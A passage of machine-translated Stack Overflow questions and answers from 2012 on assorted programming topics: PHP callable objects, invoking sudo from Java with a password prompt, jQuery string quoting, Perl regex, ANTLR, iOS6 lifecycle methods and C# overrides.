> 时间：2012-09-26T14:07:48.490

使用[ASCII 艺术](http://en.wikipedia.org/wiki/ASCII_art)，因为

a）它将起作用并且

b) 您将获得基于文本的真实冒险外观。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T13:58:05.063

在 UNIX 系统下，您可以使用 termcaps 做很多与文本相关的事情。但是我不知道它在 Windows 系统下是如何工作的……这是[termcaps 库文档](http://www.gnu.org/software/termutils/manual/termcap-1.3/html_chapter/termcap_2.html)。

# php - 如何调用类内部成员变量的__invoke方法

> ID：12603316
> 
> 赞同：17
> 
> 时间：2012-09-26T13:52:03.660
> 
> 标签：php, function, invoke, member, functor

PHP 5.4.5，在这里。我正在尝试调用一个对象，该对象存储为其他对象的成员。像这样（非常粗略）

```
class A {
    function __invoke () { ... }
}

class B {
    private a = new A();
 ...
    $this->a();  <-- runtime error here
} 
```

当然，这会产生运行时错误，因为没有名为 a 的方法。但是如果我这样写电话：

```
($this->a)(); 
```

然后我得到一个语法错误。

当然，我可以写

```
$this->a->__invoke(); 
```

但这似乎是难以忍受的丑陋，而是破坏了函子的意义。我只是想知道是否有更好的（或官方的）方法。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-09-26T14:02:43.017

有三种方式：

直接调用`__invoke`，您已经提到过：

```
$this->a->__invoke(); 
```

通过分配给变量：

```
$a = $this->a;
$a(); 
```

通过使用`call_user_func`：

```
call_user_func($this->a); 
```

最后一个可能是您正在寻找的。它的好处是它可以与任何可调用对象一起使用。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2016-08-14T04:55:25.350

仅供参考，PHP 7+ 中围绕对象内部回调的括号现在可以工作：

```
class foo {                                                                     
    public function __construct() {                                             
        $this -> bar = function() {                                             
            echo "bar!" . PHP_EOL;                                              
        };                                                                      
    }                                                                           

    public function __invoke() {                                                
        echo "invoke!" . PHP_EOL;                                               
    }                                                                           
}                                                                               

(new foo)();                                                                    

$f = new foo;                                                                   
($f -> bar)(); 
```

结果：

```
invoke!
bar! 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-10-20T05:34:22.247

我知道这是一个迟到的答案，但是在父类中使用 __call() 和子类中的 __invoke() 组合：

```
class A {
  function __invoke ($msg) {
    print $msg;
  }
}

class B {
    private $a;

    public function __construct() { $this->a = new A(); }

    function __call($name, $args)
    {
      if (property_exists($this, $name))
      {
        $prop = $this->$name;
        if (is_callable($prop))
        {
          return call_user_func_array($prop, $args);
        }
      }
    }
} 
```

然后你应该能够实现你正在寻找的语法糖：

```
$b = new B();
$b->a("Hello World\n"); 
```

# java - 带有 JAVA/shellscripts 的 sudo 命令

> ID：12603318
> 
> 赞同：1
> 
> 时间：2012-09-26T13:52:05.640
> 
> 标签：java, shell, terminal, command, sudo

我正在尝试用 JAVA 做一个简单的关机程序，但我不敢相信我在其他任何地方都找不到答案。

我首先尝试在我的 java 程序中使用 sudo：

```
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class themain{
public static void main(String[] args){
    Process ls=null;
    BufferedReader input=null;
    String line=null;
    String[] cmd = {"sudo shutdown -h +20"};

        try {

               ls= Runtime.getRuntime().exec(cmd);
               input = new BufferedReader(new InputStreamReader(ls.getInputStream()));

            } catch (IOException e1) {
                e1.printStackTrace();  
                System.exit(1);
            }

           try {
                   while( (line=input.readLine())!=null)
                    System.out.println(line);

            } catch (IOException e1) {
                e1.printStackTrace();  
                System.exit(0);
            }        
}

} 
```

然后我尝试在其中执行包含以下代码的 shell 脚本：

```
 sudo shutdown -h +20 
```

新的 java 程序现在看起来像这样：

```
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class themain{
public static void main(String[] args){
    Process ls=null;
    BufferedReader input=null;
    String line=null;
    String[] cmd = {"sh shutdown.sh"};

        try {

               ls= Runtime.getRuntime().exec(cmd);
               input = new BufferedReader(new InputStreamReader(ls.getInputStream()));

            } catch (IOException e1) {
                e1.printStackTrace();  
                System.exit(1);
            }

           try {
                   while( (line=input.readLine())!=null)
                    System.out.println(line);

            } catch (IOException e1) {
                e1.printStackTrace();  
                System.exit(0);
            }        
}

} 
```

这当然也不起作用......无论如何我可以调用密码图形密码提示吗？而且我希望这个程序可以在每台计算机上运行，​​所以我不想弄乱我的个人 sudoers 文件......

问候和感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T13:57:40.480

注意[这个线程](http://www.coderanch.com/t/517209/java/java/provide-password-prompt-through-Java)，特别是：

> 'sudo' 的密码需要通过键盘提供，或者需要通过使用“sudo -A”的 SUDO_ASKPASS 环境变量定义的进程来提供。通过 Java 调用脚本，您的脚本将无法访问键盘，因此您必须将环境变量设置为指向返回以“\n”结尾的密码的程序。您可以使用“gksudo”而不是直接使用“sudo”，这将弹出一个对话框，提示用户输入密码。这是我的首选解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-12T17:35:13.787

```
package me.barwnikk.library.linuxcommandroot;

import java.awt.BorderLayout;
import java.io.IOException;
import java.io.InputStream;

import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;

public class LinuxCommand {
    static InputStream is;
    static byte[] buff = new byte[8192];
    static int n;
    public static String getPasswdForRoot() throws IOException {
        Process p = Runtime.getRuntime().exec(new String[]{"sh","-c","sudo -S id"});
        is = p.getErrorStream();
        n = is.read(buff, 0, 8192);
        String text = new String(buff,0,n);
        if(text.contains("root"))return null; //not set password
        JPanel panel = new JPanel(new BorderLayout());
        JLabel lab = new JLabel(text);
        panel.add(lab,BorderLayout.NORTH);
        JPasswordField password = new JPasswordField();
        panel.add(password,BorderLayout.SOUTH);
        JOptionPane.showMessageDialog(null, panel);
        byte[] passwd = (new String(password.getPassword())+"\r\n").getBytes();
        p.getOutputStream().write(passwd);
        p.getOutputStream().flush();
        n = is.read(buff, 0, 8192);
        if(n==-1) return new String(password.getPassword());
        text = new String(buff,0,n);
        while(true) {
            lab.setText(text);
            JOptionPane.showMessageDialog(null, panel);
            p = Runtime.getRuntime().exec(new String[]{"sh","-c","sudo -S id"});
            is = p.getErrorStream();
            n = is.read(buff, 0, 8192);
            passwd = (new String(password.getPassword())+"\n").getBytes();
            p.getOutputStream().write(passwd);
            p.getOutputStream().flush();
            n = is.read(buff, 0, 8192);
            if(n==-1) return new String(password.getPassword());
            text = new String(buff,0,n);
        }
    }
    public static Process runFromRoot(String command, String password) throws IOException {
        byte[] passwd = (password+"\n").getBytes(); //for OutputStream better is byte[]
        Process p = Runtime.getRuntime().exec(new String[]{"sh","-c","sudo -S "+command});
        p.getOutputStream().write(passwd);
        p.getOutputStream().flush();
        return p;
    }
} 
```

这是一个获取root密码的迷你api（用户必须写正确）。使用示例：

```
public static void main(String[] args) throws IOException, InterruptedException {
    String password = LinuxCommand.getPasswdForRoot();
    System.out.println("stdout of 'id':");
    Process p = LinuxCommand.runFromRoot("id",password);
    System.out.print(streamToString(p.getInputStream()));
    System.out.println("stdout of 'fdisk -l':");
    p = LinuxCommand.runFromRoot("fdisk -l",password);
    System.out.print(streamToString(p.getInputStream()));
} 
```

方法流到字符串：

```
public static String streamToString(InputStream stream) {
    String read = "";
    try {
        while((n=stream.read(buff, 0, 8192))!=-1) {
            read+=new String(buff,0,n);
        }
    } catch (IOException e) {
        e.printStackTrace();
    }
    return read;
} 
```

我的测试中的样本返回（波兰语）：

```
stdout of 'id':
uid=0(root) gid=0(root) grupy=0(root)
stdout of 'fdisk -l':

Disk /dev/sda: 640.1 GB, 640135028736 bytes
głowic: 255, sektorów/ścieżkę: 63, cylindrów: 77825, w sumie sektorów: 1250263728
Jednostka = sektorów, czyli 1 * 512 = 512 bajtów
Rozmiar sektora (logiczny/fizyczny) w bajtach: 512 / 4096
Rozmiar we/wy (minimalny/optymalny) w bajtach: 4096 / 4096
Identyfikator dysku: 0xc56b9eef

Urządzenie Rozruch   Początek      Koniec   Bloków   ID  System
/dev/sda1            2048    37064703    18531328   27  Hidden NTFS WinRE
/dev/sda2   *    37064704    37269503      102400    7  HPFS/NTFS/exFAT
/dev/sda3        37269504   456711884   209721190+   7  HPFS/NTFS/exFAT
/dev/sda4       456711946  1250258624   396773339+   f  W95 Rozsz. (LBA)
Partycja 4 nie zaczyna się na granicy bloku fizycznego.
/dev/sda5       456711948   810350729   176819391    7  HPFS/NTFS/exFAT
Partycja 5 nie zaczyna się na granicy bloku fizycznego.
/dev/sda6       810350793   862802954    26226081    7  HPFS/NTFS/exFAT
Partycja 6 nie zaczyna się na granicy bloku fizycznego.
/dev/sda7       862803018  1020078408    78637695+  83  Linux
Partycja 7 nie zaczyna się na granicy bloku fizycznego.
/dev/sda8      1020079368  1229791814   104856223+   7  HPFS/NTFS/exFAT
/dev/sda9      1229791878  1250258624    10233373+   7  HPFS/NTFS/exFAT
Partycja 9 nie zaczyna się na granicy bloku fizycznego. 
```

为你：

```
LinuxCommand.runFromRoot("shutdown -h 20",getPasswdForRoot()); 
```

此 api 创建并写入进程密码。

# jquery - 追加时的jQuery setTimeout

> ID：12603321
> 
> 赞同：4
> 
> 时间：2012-09-26T13:52:13.130
> 
> 标签：jquery

我正在尝试在 jQuery 中为以下 append 方法设置超时。我尝试过的一切都在不断返回`Uncaught SyntaxError: Unexpected identifier`

这是我的代码：

```
 setTimeout("$('#user-comments').append('<div class='video_comment'>
<div class='name'>David</div><div class='time'>test</div>
<div class='indiv-comment'><p>'"+message+"'</p></div></div><hr class='gray' />')",3000); 
```

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-26T13:53:54.587

```
setTimeout(function () {
    $("#user-comments").append('<div class="video_comment">
                                <div class="name">David</div>
                                <div class="time"><?php echo date('F j, Y, g:i a'); ?></div>
                                <div class="indiv-comment"><p>' + message + '</p></div></div>');
}, 3000); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:07:36.650

首先，换行符在 javascript 中可能是个大麻烦。正如尼尔所说，您需要转义引号。有时，分解较长的字符串会使它更具可读性。此外，您可以为 setTimeout 提供函数而不是字符串。这是一个例子：

```
setTimeout(function() {
    var nameTag = '<div class="name">David</div>';
    var timeTag = '<div class="time">test</div>';
    var commentTag = '<div class="indiv-comment"><p>' + message + '</p></div>';
    var wrap = '<div class="video_comment">' +
                   nameTag +
                   timeTag +
                   commentTag +
               '</div><hr class="gray" />';

    $('#user-comments').append(wrap)
}, 3000); 
```

这样，您可以清楚地看到哪些引号在哪里开始和结束，并且您根本不必担心字符串中的换行符。

# perl - 使用 Perl 在单个字符串中查找多个子字符串

> ID：12603324
> 
> 赞同：2
> 
> 时间：2012-09-26T13:52:20.497
> 
> 标签：perl, substring

我需要获取以下字符串并将其分成块：

> [ToNode=cup-subscriber][Reason=Critical service is down][FromNode=cup-publisher][AppID=Cisco UP Server Recovery Manager]

每个块都封装在括号中。我正在寻找在 Perl 中执行此操作，并且正在寻找一种方法的方向。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-26T13:57:31.837

对正则表达式使用 /g 修饰符。在列表上下文中提取到数组中：

```
$data = "[ToNode=cup-subscriber][Reason=Critical service is down][FromNode=cup-publisher][AppID=Cisco UP Server Recovery Manager]"
my @chunk = ( $data =~ /\[(.*?)\]/g ); 
```

或在 while 循环中迭代块：

```
$data = "[ToNode=cup-subscriber][Reason=Critical service is down][FromNode=cup-publisher][AppID=Cisco UP Server Recovery Manager]"
while ( $data =~ /\[(.*?)\]/g ) {
    process($1);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T13:59:27.153

您可以在使用前瞻和后瞻断言之间`]`进行拆分：`[`

```
$str = '[ToNode=cup-subscriber][Reason=Critical service is down]
        [FromNode=cup-publisher][AppID=Cisco UP Server Recovery Manager]';

@pieces = split/(?<=\])(?=\[)/,$str; 
```

[**看见**](http://ideone.com/DC84u)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:51:36.963

试试这个：

```
my $str = '[ToNode=cup-subscriber][Reason=Critical service is down][FromNode=cup-publisher][AppID=Cisco UP Server Recovery Manager]';
my %fields = $str =~ m{\[([^][=]+)=([^][=]+)\]}g;
say "$_: $fields{$_}" for sort keys %fields; 
```

或者更详细地说：

```
my $str = '[ToNode=cup-subscriber][Reason=Critical service is down][FromNode=cup-publisher][AppID=Cisco UP Server Recovery Manager]';

# Capture all occurrences of ...
my %fields = $str =~ m{
            \[              # Open bracket
            ( [^][=]+ )     # Sequence of 1 or more non ][= characters
            =               # Equals
            ( [^][=]+ )     # Sequence of 1 or more non ][= characters
            \]              # Close bracket
        }xg;

# Dump contents of %fields
say "$_: $fields{$_}" for sort keys %fields; 
```

# antlr - ANTLR：Lexer 无法识别令牌

> ID：12603326
> 
> 赞同：2
> 
> 时间：2012-09-26T13:52:26.260
> 
> 标签：antlr, antlr3, lexer, parser-generator

给定以下 Lexer 语法：

```
lexer grammar CodeTableLexer;

CodeTabHeader   : '[code table 1.0]';
Code            : 'code';
Table           : 'table';
End             : 'end';
Row             : 'row';
Naming          : 'naming';
Dfltlang        : 'dfltlang';
Language        : 'english' | 'german' | 'french' | 'italian' | 'spanish';
Null            : 'null';

Number
    : Int ('.' Digit*)?
    ;

Identifier
    : ('a'..'z' | 'A'..'Z' | '_') ('a'..'z' | 'A'..'Z' | '_' | '$' | '.' | Digit)*
    ;

String
@after {
    setText(getText().substring(1, getText().length() - 1).replaceAll("\\\\(.)", "$1"));
}
    : '"' (~('"'))* '"'
    ;

Comment
    : '--' ~('\r' | '\n')* { skip(); }
    | '/*' .* '*/'         { skip(); }
    ;

Space
    : (' ' | '\t' | '\r' | '\n' | '\u000C') { skip(); }
    ;

fragment Int
    : '1'..'9'
    | '0'
    ;

fragment Digit
    : '0'..'9'
    ; 
```

...以下解析器语法：

```
parser grammar CodeTableParser;

parse
    : header^ begin (row)* end EOF
    ;

header
    : CodeTabHeader
    ;

begin
    : Code Table Identifier row
    ;

row
    : Row (Number | Identifier) value
    ;

value
    : (Identifier (Number | Identifier | String))+
        (Naming Dfltlang String (Language String)*)?
    ;

end
    : End Code Table
    ; 
```

...最后是以下要解析的源：

```
[code table 1.0]

code table my_table
row 1
    id              "my_id_1"
    name            "my_name_1"
    descn           "my_description_1"
    naming
        dfltlang    "My description 1"
        english     "My description 1"
        german      "Meine Beschreibung 1"

row 2
    id              "my_id_2"
    name            "my_name_2"
    descn           "my_description_2"
    naming
        dfltlang    "My description 2"
        english     "My description 2"
        german      "Meine Beschreibung 2"

end code table 
```

我总是收到错误消息

```
line 1:0 extraneous input '[code table 1.0]' expecting CodeTabHeader 
```

我有点困惑……令牌 CodeTabHeader 在我的词法分析器中被定义为“[code table 1.0]”；我错过了什么吗？任何帮助将非常感激。

谢谢， J3d

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T20:27:10.193

如果您将词法分析器和解析器拆分为两个不同的文件，请在`options`解析器的 -block 中明确指出它应该使用哪些标记：

```
options {
  tokenVocab=CodeTableLexer;
} 
```

# php - 如何在网站上显示来自 RSS 链接的视频

> ID：12603327
> 
> 赞同：0
> 
> 时间：2012-09-26T13:52:33.480
> 
> 标签：php, xml

使用以下链接，我获得了视频的 RSS 提要
[http://rss.cnn.com/services/podcasting/ac360/rss.xml](http://rss.cnn.com/services/podcasting/ac360/rss.xml)

我需要使用 PHP 中的 DOMDocument() 获取此链接并在我的网站上显示视频。
如何从 RSS 提要中获取这些视频并在我的网站上显示？
这是我的代码

```
$xml=("rss.cnn.com/services/podcasting/ac360/rss.xml";);
$xmlDoc = new DOMDocument();
$xmlDoc->load($xml); 
$channel=$xmlDoc->getElementsByTagName('channel')->item(0); 
for ($i=0; $i<=2; $i++) {      
    $item_title=$x->item($i)
                  ->getElementsByTagName('title')
                  ->item(0)
                  ->childNodes
                  ->it‌​em(0)
                  ->nodeValue;   
    $item_link=$x->item($i)
                 ->getElementsByTagName('link')
                 ->item(0)
                 ->childNodes
                 ->item‌​(0)
                 ->nodeValue;  
    $item_desc=$x->item($i)
                 ->getElementsByTagName('description')
                 ->item(0)
                 ->childNode‌​s
                 ->item(0)
                 ->nodeValue;
    echo ("<p><a href='" . $item_link. "'>" . $item_title . "</a>");
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:43:45.123

视频 url 在`<media:content>`标签的`url`属性下，你可以使用 xpath 来抓取这样的：

```
$xml=("rss.xml");
$doc = new DOMDocument();
$doc->load($xml);
$xpath = new DOMXPath($doc);
foreach ($xpath->query('//item') as $item) {
    $media = $xpath->query('//media:content', $item);
    $title = $xpath->query('//title', $item);
    print '<a href="'.$media->item(0)->getAttribute('url').'">'.$title->item(0)->textContent."</a>\n";
} 
```

[还可以考虑使用像simplepie](http://www.simplepie.org/)这样的rss 解析库

# php - 提交后让登录系统在弹出窗口内工作并重定向

> ID：12603332
> 
> 赞同：0
> 
> 时间：2012-09-26T13:52:47.263
> 
> 标签：php, login, popup

我注意到由于缺乏详细信息和信息，我的旧问题已经结束。

基本上我需要的是在我的 Popup 插件中工作的当前登录系统。

[http://justxp.plutohost.net/test3/](http://justxp.plutohost.net/test3/)

单击“登录”按钮以打开弹出窗口。

我需要使用我拥有的登录系统的用户名表单、密码表单、提交表单。

这就是我所说的弹出窗口：

```
<a href="#" class="big-link" data-reveal-id="myModal"><img src="img/login.png" 
onmouseover="this.src='img/hover1.png'" 
onmouseout="this.src='img/login.png'"></a>

<div id="myModal" class="reveal-modal">
<h1>Login</h1>
<p>Please enter your username and password carefully.</p>
</form>
<a class="close-reveal-modal">&#215;</a>
</div> 
```

我用于弹出模式的插件：[http ://www.zurb.com/playground/reveal-modal-plugin](http://www.zurb.com/playground/reveal-modal-plugin)

这是我的login.php，我真的不明白他们是如何在这个中完成登录系统的：

[http://pastebin.com/WegLBhYi](http://pastebin.com/WegLBhYi)

该脚本基本上打印出错误消息，并在登录时重定向到 member.php 文件。

我想要什么：

我希望这个确切的登录系统在弹出窗口中也能正常工作，成功登录后，它也会将您重定向到 member.php，如果登录失败，它会将您重定向到 logerror.php（具有相同布局的新页面）并显示错误消息并允许您重新登录。

这是我的 header.php，它基本上显示了登录用户或访客的布局

[http://pastebin.com/XCcnNiKg](http://pastebin.com/XCcnNiKg)

如果您对如何使用此代码进行登录有任何想法，那就太好了！如您所见，此脚本的编码非常糟糕。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:09:32.597

The form inside your lightbox login has no action on it. Look at line 40 of the HTML Source. So right now the form is just submitting to the same page and sending the info as GET variables. I don't see in your PHP code where you create the myModal div but you need to add an action that sends info to a php file that can check the login and password against your database, it can then redirect to member.php or the logerror.php

Also FYI You have two different versions of Jquery being loaded.

# ios6 - iOS6 viewDidUnload 已弃用

> ID：12603336
> 
> 赞同：64
> 
> 时间：2012-09-26T13:52:57.067
> 
> 标签：ios6

也许这是一个不好的做法，但是从我阅读的文档中，我得到了在某些情况下在 viewDidLoad 方法中初始化对象并在 viewDidUnload 中将其设为 nil 的建议。

例如，如果您有添加观察者之类的东西

```
[[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(filterready:)
                                                 name:@"filterReady"
                                               object:nil]; 
```

现在我没有删除观察者的方法，但是每次显示视图时都会调用 viewDidLoad，这会导致一段时间后运行多个观察者，然后多次调用选择器。

我可以通过将一些清洁器移入 viewDidDisappear 方法来解决这个问题，但现在我怀疑我是否做对了。

在我的示例中，我有多个控制其子导航的导航控制器，但从未为它们调用 dealloc，即使它们没有被引用

* * *

## 回答 #1

> 赞同：110
> 
> 时间：2012-09-26T14:04:08.540

您应该使用 `- (void)didReceiveMemoryWarning` and `- (void)dealloc`方法。

> 在 iOS 6 中，UIViewController 的 viewWillUnload 和 viewDidUnload 方法现已弃用。如果您使用这些方法来释放数据，请改用 didReceiveMemoryWarning 方法。如果不使用视图控制器的视图，您也可以使用此方法释放对视图控制器的视图的引用。在执行此操作之前，您需要测试视图是否不在窗口中。

所以你应该先检查你的视图是否在窗口中，然后在窗口中移除你的观察者`didReceiveMemoryWarning`

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-10-31T00:04:32.130

首先，即使`viewDidUnload`没有被弃用，您也必须在`viewDidUnload`AND中取消注册该通知`dealloc`。即使在 iOS 6 之前，`viewDidUnload`大多数情况下也不会调用；仅在内存不足的情况下。所以如果你只是把它放进去`viewDidUnload`而不是`dealloc`之前，它就不会被取消注册，它可能会在它被释放并收到通知时崩溃。所以你必须先把它放进去`dealloc`，它才能正常工作。

其次，如果你之前做的正确，你不需要做任何额外的事情来让它在 iOS 6 中正常工作。iOS 6 中唯一的区别是视图不再被卸载（即使在内存不足的情况下）。因此，当您没有遇到内存不足的情况时，它与 iOS 5 中的情况相同。由于视图没有被卸载，`viewDidLoad`只会被调用一次，所以你的通知只会被注册一次。它将在 中取消注册`dealloc`，因为您必须将其放入它才能正常工作。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2012-10-29T11:30:50.927

亚历克斯的回答很好。但我喜欢适当的配对。出于这个原因，除非视图需要在它甚至没有看到时被通知，否则我通常会在 viewWillAppear 和 viewDidDisappear 添加通知

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-09-26T13:56:28.137

为什么不直接删除 DEALLOC 函数中的观察者呢？如果您使用 ARC，请不要调用 [super dealloc]

如果您查看控制器 dealloc 函数没有被调用，那么您需要找出原因。也许你有一个在 ViewController 上运行的 NSTimer，当你弹出视图时，这会导致 dealloc 不会被调用。或者视图被保留在其他地方。

# javascript - 在 javascript 中使用 this 关键字时出现严格违规是什么意思？

> ID：12603340
> 
> 赞同：2
> 
> 时间：2012-09-26T13:53:11.250
> 
> 标签：javascript, jquery, this, jslint, strict-mode

有人可以给我这个建议。我刚开始使用 jslint，我收到一条错误消息“严格违反”，指向带有“dialog(this)”的行 -

```
function accessLinkClick(e) {
    e.preventDefault();
    $('.accessLink')
    .unbind('click', accessLinkClick);
    dialog(this);
}

function accessControls() {
    $('.accessLink')
        .bind('click', accessLinkClick);
    $('#logoutLink')
        .click(function (e) {
            window.location = $(this).attr('data-href');
        });
} 
```

我以前从未见过这条消息。这是什么意思？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-02-19T07:59:39.330

规范的附件 C 是这样解释的：

> 如果`this`在严格模式代码中进行评估，则**this 值不会被强制转换为 object**。or的`this`值不转换为全局对象，原始值不转换为包装对象。通过函数调用（包括使用 Function.prototype.apply 和 Function.prototype.call 进行的调用）传递的值不会强制将传递的值传递给对象（10.4.3、11.1.1、15.3.4.3、15.3.4.4） .`null``undefined``this``this`

在上述代码中使用`e.target`而不是。`this`

**参考**

*   [注释 ES5：附件 C](http://es5.github.io/#C)

# c# - c# 运行时跳过覆盖，有时

> ID：12603343
> 
> 赞同：1
> 
> 时间：2012-09-26T13:53:18.093
> 
> 标签：c#, runtime, overriding

我在我的 c# 代码中遇到了一个不起眼的运行时崩溃错误。从堆栈跟踪中可以看出，有时，很少会跳过覆盖，而是调用基类方法。伪代码如下所示：

```
public class Widget : Gear
{
    public override string Spin()
    {
        return "crunch";
    } 
}

public class Gear
{
    public virtual string Spin()
    {
        return "whirr";
    }
} 
```

如果我这样称呼它一千次，就像这样：

```
var widget = new Widget();
for (var i = 0; i < 1000; i++)
{
   Console.WriteLine(widget.Spin());
} 
```

我可能会得到一个调用基类的迭代：

```
> ...
> crunch
> crunch
> crunch
> whirr
> crunch
> ... 
```

现在我的实际场景是使用实体框架并且错误发生在 EntityContext.SaveChanges() 方法中，因为我的覆盖中的某些事情没有发生，并且堆栈跟踪显示覆盖被跳过，但上面的代码代表症状。

我的问题是：（1）这可能吗？(2) 可以预防吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-26T13:56:36.267

您的 Gear 类需要将 Spin 函数标记为虚拟：

```
class Gear {
  public virtual string Spin() {
    return "whirr";
  }
} 
```

在我的测试中，我得到了 1000 次“仰卧起坐”。

如果您的`EntityContext.SaveChanges()`方法中发生这种情况，那么不幸的是，发布的代码不能代表问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T13:57:06.750

类齿轮上的方法 Spin 需要标记为虚拟，实际上我很惊讶这个编译

我的测试（设置为虚拟）工作正常

# python - 如何使用在 Windows 下运行的 Python 检测笔记本电脑盖的打开/关闭？

> ID：12603351
> 
> 赞同：4
> 
> 时间：2012-09-26T13:53:38.810
> 
> 标签：python, windows

如何使用在 Windows 下运行的 Python 检测笔记本电脑盖的打开/关闭？

# c# - 在 C# 中，两个文本字段如何具有相同的属性名称？

> ID：12603353
> 
> 赞同：0
> 
> 时间：2012-09-26T13:53:39.827
> 
> 标签：c#

我正在更改由在我之前担任我职位的人构建的解决方案，并且我正在尝试重现他所做但遇到问题的事情。

该解决方案有两种形式：报告输入和报告审查。这些文本字段的所有属性名称都具有相同的名称（即 txtProduct 出现在 Reports Entry 和 Reports Review 表单上。）我正在尝试添加一个名为 txtComments 的新文本字段，但是在我在一个中创建了这个字段之后的表单并尝试将相同的字段添加到另一个，它告诉我属性值无效：txtComments 已被另一个组件使用。

我该如何解决这个问题？

* * *

谢谢你的回复。原来是两个同名的文本字段。

# c++ - 接口无法访问？

> ID：12603359
> 
> 赞同：3
> 
> 时间：2012-09-26T13:54:00.640
> 
> 标签：c++, inheritance, interface

> **可能重复：**
> [C++ 继承 - 无法访问的基础？](https://stackoverflow.com/questions/4847100/c-inheritance-inaccessible-base)
> [为什么编译器会选择模板参数列表中的基类构造函数？](https://stackoverflow.com/questions/9223441/why-does-the-compiler-select-the-base-class-constructor-inside-the-template-argu)

```
class InterfaceA
{
public:
  virtual void f () = 0;
};

class A :
  private InterfaceA
{
public:
  void f () {}

};

class B :
  public A
{
private:
  /*::*/InterfaceA * m_a; // Adding "::" makes it work
}; 
```

GCC 和 VS2008 说`‘class InterfaceA’ is inaccessible`。如果我`m_a`用明确的全局范围声明一切都编译得很好。

upd:`m_a`是 a `pointer`，而不是对象本身。事实上，为什么我不能声明`a pointer`以及为什么添加“::”可以解决这个问题？

# google-drive-api - 是否有测试云端硬盘应用的最佳实践指南？

> ID：12603361
> 
> 赞同：2
> 
> 时间：2012-09-26T13:54:06.140
> 
> 标签：google-drive-api

我发现很难正确开发、测试、暂存和发布我的云端硬盘应用程序。作为我面临的这类问题的一个例子，当我在 Api 控制台中配置我的应用程序时，我需要为“从驱动器打开”指定一个 URL。显然，我无法在不影响实时用户的情况下改变这一点。所以我有点得出结论，我需要注册我的应用程序的多个副本。每个开发、测试和部署阶段都需要一个副本。

有没有人经历过这个过程并制定了一套最佳实践指南？

# c++ - c++11 和 boost_filesystem cout 和 printf 不起作用

> ID：12603363
> 
> 赞同：0
> 
> 时间：2012-09-26T13:54:23.707
> 
> 标签：c++, boost, c++11, printf, cout

我在使用 boost/filesystem.hpp 时遇到了 printf 和 cout 的问题

我在 eclipse juno 中使用 mingw 设置创建了一个 c++ 项目

objectfile.hpp 包含声明，#include "boost/filesystem.hpp"
objectfile.cpp 包含 boost::filesystem::exists(...) 的定义和用法
mainfile.cpp 包含以下代码：

```
#include <stdio.h>
using namespace std;

int main() {
  printf("asdf\n");
  cout <<"asdf"<<endl;
  return 0;
} 
```

mainfile.cpp 不包含 objectfile.hpp 的标头，但在链接阶段被链接。boost_system 和 boost_filesystem 也是链接的。

问题：输出为空。在我删除 boost/filesystem.hpp 和相应的代码然后重新编译之前，没有任何输出。

我还没有测试过其他的 boost 库。也许其他人也有类似的问题？

Windows 7 64 位
Eclipse Juno 64 位 -std=c++11 编译器选项
Boost 1.51 多线程动态链接

## 更新

我使用以下选项重建了 Boost 1.51：
-j8 toolset=gcc cxxflags=-std=gnu++0x variant=release optimization=speed link=static threading=multi --layout=system --prefix=boost install

**现在它可以工作了。**

谢谢马歇尔克劳。**_** 提交答案，我会接受。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-03T06:18:38.777

重新提交作为答案：

您是否可以使用与您的程序不同的编译器选项构建 boost 库？具体来说，我会检查`std=c++11`.

# linux - 将 VxWorks intConnect API 移植到 linux

> ID：12603375
> 
> 赞同：1
> 
> 时间：2012-09-26T13:55:10.213
> 
> 标签：linux, interrupt, porting, vxworks

我正在尝试将 VxWorks API 移植到 linux。在我找到 intArchLib apis 之前它工作正常。如何将 int API (intConnect,intLock ...) 移植到 Linux。

intConnect ：此 api 为中断向量 (IRQ) 注册中断例程 (ISR)。当注册中断发生时，将调用该 ISR。

1.  在 Linux 中是否可以在没有内核模式驱动程序的情况下进行移植？
2.  在 Linux 中是否可以在没有用户模式驱动程序的情况下进行移植？

请帮我。

党卫军

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-03T20:34:18.993

没有合理的方法将 intConnect 移植到 Linux。换句话说，intConnect 是 vxWorks 中的一个 API，设备驱动程序不应该直接使用它。应该使用 intConnect 来实现其他高抽象接口。例如，从 vxWorks 6.6 开始，vxbIntConnect 使用 intConnect 实现。

# java - 将字符串可写数组从 Java 传递到 C（使用 JNA）

> ID：12603376
> 
> 赞同：1
> 
> 时间：2012-09-26T13:55:12.833
> 
> 标签：java, c, jna

我使用 JNA 从 java 调用 ac 函数。该函数将字符串列表写入用户提供的内存，其签名如下：

```
void c_getStrings(char *buf, size_t bufSize, char *strings[], size_t *stringsCount) 
```

使用 Java 版本：

```
public interface TestCaseDLL extends Library
{
    int c_getStrings(byte[] buf, int bufSize, Memory strings, IntByReference stringCount);
}

public class TestCase
{
    public static void main(String[] args)
    {
        byte[] buf = new byte[100];
        Memory strings = new Memory(Memory.SIZE * 10);
        IntByReference stringCount = new IntByReference(10);

        // c_getStrings() will write the strings continuously to 'buf' and
